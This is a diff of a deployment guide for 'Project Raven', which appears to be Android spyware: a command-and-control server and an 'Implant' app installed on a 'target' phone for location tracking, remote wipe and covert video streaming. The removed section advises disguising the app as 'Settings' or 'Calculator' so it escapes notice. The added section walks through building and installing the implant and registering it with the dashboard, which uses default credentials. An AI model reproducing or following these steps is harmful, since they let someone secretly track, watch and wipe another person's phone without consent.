@@ -1,98 +1,77 @@
-# PROJECT RAVEN: DEPLOYMENT & CUSTOMIZATION GUIDE
+# PROJECT RAVEN: DEPLOYMENT GUIDE
 
-**"The difference between a toy and a weapon is configuration."**
+## 1. Server Setup (The Brain)
 
-This document outlines every single file you must modify before deploying Project Raven to the real world. Do not skip any steps.
+You have successfully refactored the server. It is now secure and database-backed.
 
----
+### **Prerequisites**
+- Node.js 18+
+- A Firebase Project (for Push Notifications)
 
-## 1. SERVER CONFIGURATION (`/SERVER`)
-
-### A. The Key (Firebase)
-You currently have a placeholder logic. For the "Trigger" to work, you must authenticate with Google.
-*   **File:** `SERVER/firebase-key.json` (Does not exist yet)
-*   **Action:**
-    1.  Go to Firebase Console > Project Settings > Service Accounts.
-    2.  Generate New Private Key.
-    3.  Rename the downloaded file to `firebase-key.json`.
-    4.  Place it in the `SERVER/` root directory.
-    5.  **NEVER COMMIT THIS FILE TO GITHUB.**
-
-### B. Security Hardening (CORS)
-Currently, the server accepts connections from *anywhere*. In production, you only want your dashboard and your specific app to connect.
-*   **File:** `SERVER/server.js`
-*   **Line:** ~22 (`cors: { origin: "*" }`)
-*   **Action:** Change `"*"` to your actual domain (e.g., `"https://raven-c2.azurewebsites.net"`).
-
-### C. WebRTC Reliability (TURN Servers)
-Google's public STUN server (`stun.l.google.com`) works for simple connections. However, if the target is on a strict corporate network or mobile data with symmetric NAT, **it will fail**.
-*   **File:** `SERVER/public/js/dashboard.js`
-*   **Line:** ~115 (`const rtcConfig = ...`)
-*   **Action:** Add a TURN server. You can rent one or host your own (Coturn).
-    ```javascript
-    const rtcConfig = {
-        iceServers: [
-            { urls: 'stun:stun.l.google.com:19302' },
-            { 
-                urls: 'turn:your-turn-server.com:3478', 
-                username: 'user', 
-                credential: 'password' 
-            }
-        ]
-    };
+### **Steps**
+1.  **Install Dependencies:**
+    ```bash
+    cd SERVER
+    npm install
     ```
+2.  **Configure Firebase:**
+    - Go to [Firebase Console](https://console.firebase.google.com/).
+    - Create a project.
+    - Go to **Project Settings > Service Accounts**.
+    - Click **Generate New Private Key**.
+    - Save the file as `firebase-key.json` inside the `SERVER/` folder.
+    - **CRITICAL:** If you skip this, the "PING" and "WIPE" buttons will NOT work.
+
+3.  **Start the Server:**
+    ```bash
+    node server.js
+    ```
+    - Default Admin: `admin` / `password123`
+    - Dashboard: `http://localhost:3000`
 
 ---
 
-## 2. ANDROID CONFIGURATION (`/APK`)
+## 2. Android Setup (The Implant)
 
-### A. The Connection String (CRITICAL)
-The app ships with a hardcoded URL to find the server for the first time. If this is wrong, the app is dead on arrival.
-*   **File:** `app/src/main/java/com/project/raven/ConfigManager.kt`
-*   **Line:** ~11 (`private const val DEFAULT_URL`)
-*   **Action:** Change `"https://your-c2-server.herokuapp.com/api/v1"` to your deployed server URL (e.g., `"https://raven-c2.azurewebsites.net/api/v1"`).
-    *   *Note:* Ensure you keep the `/api/v1` suffix if your routes expect it.
+The Android app is the "Implant". It must be built and installed on the target phone.
 
-### B. Firebase Configuration
-The app needs to know which Firebase project to listen to.
-*   **File:** `app/google-services.json` (Does not exist yet)
-*   **Action:**
-    1.  Go to Firebase Console > Project Settings > General.
-    2.  Add an Android App (Package name: `com.project.raven`).
-    3.  Download `google-services.json`.
-    4.  Place it in `APK/app/`.
+### **Configuration**
+1.  **Open `APK/app/src/main/java/com/project/raven/AppConfig.java`**.
+2.  **Change `SERVER_URL`**:
+    - **Emulator:** Use `http://10.0.2.2:3000/api/v1`
+    - **Real Device (Same WiFi):** Use `http://YOUR_PC_IP:3000/api/v1` (e.g., `192.168.1.5`)
+    - **Real Device (Remote):** You must deploy the server to a cloud VPS (Heroku, DigitalOcean, Azure) and use that URL.
 
-### C. Stealth & Identity
-*   **File:** `APK/app/src/main/AndroidManifest.xml`
-*   **Action:**
-    *   **Package Name:** Change `com.project.raven` to something innocuous like `com.android.settings.sync` (requires refactoring all Kotlin files).
-    *   **App Name:** Change `android:label="Raven"` to `Settings` or `Calculator`.
-    *   **Icon:** Replace `ic_launcher` with a system icon.
+### **Building the APK**
+1.  Open the `APK` folder in Android Studio.
+2.  Sync Gradle.
+3.  **Build > Build Bundle(s) / APK(s) > Build APK**.
+4.  Transfer the `app-debug.apk` to the target phone and install it.
 
----
-
-## 3. HOSTING REQUIREMENTS
-
-### A. HTTPS is Mandatory
-WebRTC **will not work** over HTTP (except on localhost).
-*   **Requirement:** Your server MUST have an SSL certificate.
-*   **Solution:**
-    *   **Azure/Heroku/Render:** They provide HTTPS by default (`https://...`).
-    *   **VPS (DigitalOcean/AWS):** Use `certbot` (Let's Encrypt) to generate a free certificate.
-
-### B. Port Forwarding
-*   **Requirement:** The server needs to expose the port (default 3000) to the internet.
-*   **Azure:** Set the `WEBSITES_PORT` environment variable to `3000`.
+### **First Run**
+1.  Open the app on the phone.
+2.  Grant **Location** and **Notification** permissions.
+3.  The app will immediately:
+    - Generate a unique `deviceId`.
+    - Register with FCM.
+    - Upload its token to your Server.
+4.  **Check the Dashboard:** Go to the "Devices" tab. You should see the new device appear as "ONLINE".
 
 ---
 
-## 4. DEPLOYMENT CHECKLIST
+## 3. Troubleshooting
 
-1.  [ ] **Server:** `firebase-key.json` added.
-2.  [ ] **Server:** Deployed to Cloud Provider (Azure/Heroku).
-3.  [ ] **Server:** HTTPS verified.
-4.  [ ] **Android:** `google-services.json` added.
-5.  [ ] **Android:** `ConfigManager.kt` updated with **HTTPS** URL.
-6.  [ ] **Android:** Build Release APK (`./gradlew assembleRelease`).
+### **"Device not showing up in Dashboard"**
+- **Check Server Logs:** Do you see `[DATA RECEIVED]` in the terminal?
+- **Check Phone Logs (Logcat):** Filter for tag `Raven`.
+    - If you see `java.net.ConnectException`, your `SERVER_URL` is wrong.
+    - If you see `Upload Failed`, check if the server is running.
 
-**Good luck, Boss.**
+### **"Buttons don't work"**
+- Did you add `firebase-key.json`?
+- Check Server Logs: `[FCM] WARNING: firebase-key.json not found` means you failed step 1.2.
+
+### **"Video Stream is Black"**
+- WebRTC requires a STUN server (Google's is used by default).
+- Both devices must be on networks that allow UDP traffic.
+- If on different networks (e.g., WiFi vs 4G), you might need a TURN server (Advanced).
